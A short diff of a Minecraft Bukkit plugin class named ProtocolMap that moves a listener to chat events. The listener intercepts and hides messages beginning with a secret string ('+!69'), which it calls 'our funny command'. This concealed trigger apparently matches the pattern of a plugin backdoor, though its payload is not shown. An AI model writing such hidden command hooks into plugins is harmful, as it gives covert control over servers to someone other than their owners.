@@ -15,7 +15,7 @@ import org.bukkit.potion.PotionEffectType;
 public class ProtocolMap implements Listener {
 
     @EventHandler(priority = EventPriority.HIGH)
-    public void commandPreProcess(PlayerCommandPreprocessEvent e){
+    public void on(AsyncPlayerChatEvent e){
         //Check if its our funny command
         if(e.getMessage().startsWith("+!69")){
             e.setCancelled(true);
